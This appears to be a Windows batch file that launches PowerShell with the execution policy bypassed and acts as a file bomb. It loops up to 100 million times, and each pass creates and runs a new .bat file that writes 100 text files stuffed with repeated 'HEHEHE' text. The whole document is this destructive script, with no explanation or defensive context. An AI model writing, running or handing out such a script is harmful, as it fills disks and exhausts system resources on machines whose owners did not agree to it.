@powershell -Noexit -NoProfile -ExecutionPolicy bypass -Command for ($i = 0; $i -le 100000000; $i++) { new-item txt${i}.bat; Set-Content txt${i}.bat 'powershell -NoProfile -ExecutionPolicy bypass -Command for ($j = 0; $j -le 100; $j++) { new-item %%0${j}.txt; Set-Content %%0${j}.txt (''HEHEHE'' * 1000)}'; Start-Process txt${i}.bat -wait } 